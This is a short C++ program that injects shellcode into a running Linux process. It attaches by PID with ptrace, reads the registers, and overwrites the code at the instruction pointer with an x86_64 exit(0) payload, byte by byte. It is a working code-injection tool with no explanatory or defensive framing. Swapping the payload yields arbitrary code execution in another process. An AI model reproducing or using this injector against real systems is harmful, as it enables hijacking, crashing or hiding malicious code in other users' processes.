#include <iostream>

#include <cstring>

#include <unistd.h>
#include <sys/ptrace.h>
#include <sys/user.h>

#include <stdlib.h>
#include <stdio.h>

#include "../lib/include/done.h"
#include "../lib/include/fatal.h"


// Global
unsigned char code1[]="\x48\x31\xc0\xb0\x3c\x0f\x05"; // exit(0) shellcode for x86_64
struct user_regs_struct regs;

// prototypes
int InjectProcess(int pid,unsigned const char *sc, int size);

//

int main(int argc, char **argv){
    InjectProcess(atoi(argv[1]), code1, sizeof(code1));
}


int InjectProcess(int pid,unsigned const char sc[], int size){
    if (ptrace(PTRACE_ATTACH , pid,NULL,NULL)==-1){fatal("Error Attaching to process, returning -1 from InjectProcess function..!"); return -1;}
    if (ptrace(PTRACE_GETREGS, pid,NULL,&regs)==-1){fatal("Error Dumping Registers Data, Returning False");return -1;}
    for (int tmp=0; tmp<=size; tmp++)
        if(ptrace(PTRACE_POKETEXT, pid, regs.rip+tmp, sc[tmp])==-1){fatal ("An Error Ocured While injecting byte number");}

    ptrace(PTRACE_DETACH, pid, 0, 0);
    return 0;
}
